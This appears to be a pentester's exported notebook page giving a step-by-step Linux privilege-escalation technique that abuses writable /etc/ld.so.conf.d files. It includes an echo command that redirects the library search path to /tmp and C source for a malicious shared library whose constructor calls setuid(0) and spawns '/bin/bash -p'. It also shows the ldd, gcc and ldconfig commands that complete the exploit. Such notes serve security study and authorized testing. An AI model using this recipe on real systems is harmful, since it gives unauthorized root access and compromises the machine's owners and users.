<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Shared Object Injection (writable /etc/ld.so.conf.d/*.conf)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Shared Object Injection (writable /etc/ld.so.conf.d/*.conf)</h1><br/><br /><strong><h3>Prerequisite:</h3></strong><br />• writable permission on a configuration file inside /etc/ld.so.conf/  → (/etc/ld.so.conf/*.conf)<br />    <a href=""><img src="images/2164-1.png" alt="images/2164-1.png" /></a><br />OR<br />• Writable permission a folder that is inside a configuration file<br />    <a href=""><img src="images/2164-2.png" alt="images/2164-2.png" /></a><br /><br /><br /><strong><h3>Explanation</h3></strong><br />The file <strong>/etc/ld.so.conf</strong> indicates where are loaded the configurations files from. Typically, this file contains the following path: <br /><div class="codebox"><pre>include <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>ld.so.conf.d<span style="color:#ff9d00;font-weight:700">/</span>*.conf</pre></div><br />The above include command means that the configuration files from /etc/ld.so.conf.d/*.conf will be read and where libraries are going to be searched for. <br />    In the example above the libraries will be searched in /root, /home/m4l/lib, /tmp<br /><span style="text-decoration:underline;">If an a user has write permissions on any of the folders indicated by</span>: <br />• /etc/ld.so.conf<br />• /etc/ld.so.conf.d/<br />We <span style="text-decoration:underline;">may be able to escalate privileges</span>.<br />    <a href=""><img src="images/2164-3.png" alt="images/2164-3.png" /></a><br /><br /><br /><strong><h3>Privilege Escalation exploit</h3></strong><br /><br />1. Find a binary with SUID bit enabled<br />    <a href=""><img src="images/2164-4.png" alt="images/2164-4.png" /></a><br />2. Check the libraries loaded by this binary<br />    <div class="codebox"><pre>ldd <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>oracle</pre></div><br />    <a href=""><img src="images/2164-5.png" alt="images/2164-5.png" /></a><br />    libcustom.so could be our target, we need that the binary (oracle in this example) load our malicious library instead of the original libcustom.so<br /><br />3. Check configuration files inside /etc/ld.so.conf/:<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>ld.so.conf<span style="color:#ff9d00;font-weight:700">/</span></pre></div><br />   ◇ Check if we have writable permission on a folder inside a configuration file (where we can put our malicious library)<br />        <a href=""><img src="images/2164-6.png" alt="images/2164-6.png" /></a><br />   OR IN ALTERNATIVE:<br />   ◇ add a folder (/tmp) where we can put our malicious library inside a /etc/ld.so.conf.d/*.conf<br />       <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;/tmp&quot;</span> &gt; <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>ld.so.conf.d<span style="color:#ff9d00;font-weight:700">/</span>home.conf</pre></div><br />       <a href=""><img src="images/2164-7.png" alt="images/2164-7.png" /></a><br /><br />4. Create malicious library in the folder that you have found at the point before( in this example /tmp)  <br />    <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#include &lt;stdio.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">#include &lt;stdlib.h&gt;</span><br /><br /><span style="color:#0088ff;font-weight:400">#constructor attribute causes the function to be called automatically before execution enters main ()</span><br /><span style="color:#0088ff;font-weight:400"># static is not necessary in this scenario</span><br />static void <span style="color:#ffdd00;font-weight:400">inject()</span> __attribute__<span style="color:#ff9d00;font-weight:700">((</span>constructor<span style="color:#ff9d00;font-weight:700">));</span><br />void <span style="color:#ffdd00;font-weight:400">inject()</span> <span style="color:#ff9d00;font-weight:700">{</span><br />    setuid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br />    system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;/bin/bash -p&quot;</span><span style="color:#ff9d00;font-weight:700">);</span><br /><span style="color:#ff9d00;font-weight:700">}</span></pre></div><br />    <a href=""><img src="images/2164-8.png" alt="images/2164-8.png" /></a><br /><br />5. Compile the library and save it in the folder found at point 3 where we have write permission<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">gcc</span> -shared -o libcustom.so libcustom.c</pre></div><br />    <a href=""><img src="images/2164-9.png" alt="images/2164-9.png" /></a><br /><br />6. Use <br />   ◇ ldconfig to reload the /etc/ld.so.cache (to reload the cache we need the SUID bit enabled on ldconfig)<br />       <div class="codebox"><pre>ldconfig</pre></div><br />    in alternative<br />   ◇ check the content of /etc/ld.so.cache with ldconfig. <br />    In fact a binary will search inside the folders indicated by /etc/ld.so.cache first<br />    From here we can check from which folder the shared library of a binary is loaded from<br />    <div class="codebox"><pre>ldconfig -p<br /><span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>ldconfig -p</pre></div><br />    <a href=""><img src="images/2164-10.png" alt="images/2164-10.png" /></a><br />    <a href=""><img src="images/2164-11.png" alt="images/2164-11.png" /></a><br />    -p, --print-cache --&gt;  Print the lists of directories and candidate libraries  stored in the current cache<br /><br /><br />7. Now the binary should load our custom malicious library instead of the original one<br />    <a href=""><img src="images/2164-12.png" alt="images/2164-12.png" /></a><br /><br /><br /><br /><br /><br /><br /><strong>Bibliography:</strong><br /><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/ld.so.conf-example">https://book.hacktricks.xyz/linux-unix/privilege-escalation/ld.so.conf-example</a><br /><a href="https://www.boiteaklou.fr/Abusing-Shared-Libraries.html">https://www.boiteaklou.fr/Abusing-Shared-Libraries.html</a><br /><a href="https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2">https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2</a><br /><a href="https://www.youtube.com/watch?v=JvqBaZ0WnV4&t=2490s">https://www.youtube.com/watch?v=JvqBaZ0WnV4&amp;t=2490s</a></div>
</body>
</html>
